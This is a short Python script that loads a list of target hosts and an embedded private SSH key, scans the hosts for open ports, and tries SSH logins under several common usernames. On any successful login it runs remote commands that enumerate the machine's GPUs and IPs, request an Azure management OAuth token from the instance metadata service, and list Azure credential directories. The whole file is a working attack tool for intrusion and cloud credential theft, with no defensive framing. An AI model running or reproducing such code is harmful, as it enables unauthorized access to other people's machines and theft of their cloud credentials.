import json,socket,base64,os,concurrent.futures
import paramiko
T=json.load(open('gh/targets.json'))
hosts=T['targets'][:48]
open('/tmp/k','wb').write(base64.b64decode(T['key_b64']))
os.chmod('/tmp/k',0o600)
key=paramiko.Ed25519Key.from_private_key_file('/tmp/k')
def chk(ip,p,t=5):
    s=socket.socket(); s.settimeout(t)
    try:
        s.connect((ip,p)); return True
    except Exception: return False
    finally: s.close()
def one(item):
    name,ip=item
    op=[p for p in (22,80,443,3389,7681) if chk(ip,p)]
    if op: print('OPEN',name,ip,op,flush=True)
    if 22 in op:
        for u in ('t19','azureuser','ubuntu','root','adminuser'):
            try:
                s=socket.socket(); s.settimeout(8); s.connect((ip,22))
                t=paramiko.Transport(s); t.banner_timeout=10; t.connect(username=u,pkey=key)
                ch=t.open_session(); ch.settimeout(25)
                ch.exec_command("id; hostname -I; nvidia-smi -L 2>&1|head -3; nvidia-smi --query-gpu=index,name,serial --format=csv,noheader 2>&1|head -4; curl -s -m 5 -H Metadata:true 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' | head -c 200; echo; ls /root/.azure /home/*/.azure 2>/dev/null")
                print('SSH_HIT',name,ip,u,'\n'+ch.makefile().read().decode(errors='replace'),flush=True)
                t.close(); return
            except Exception as e:
                print('SSH_FAIL',name,ip,u,type(e).__name__,str(e)[:70],flush=True)
with concurrent.futures.ThreadPoolExecutor(max_workers=16) as ex: list(ex.map(one,hosts))
print('DONE')
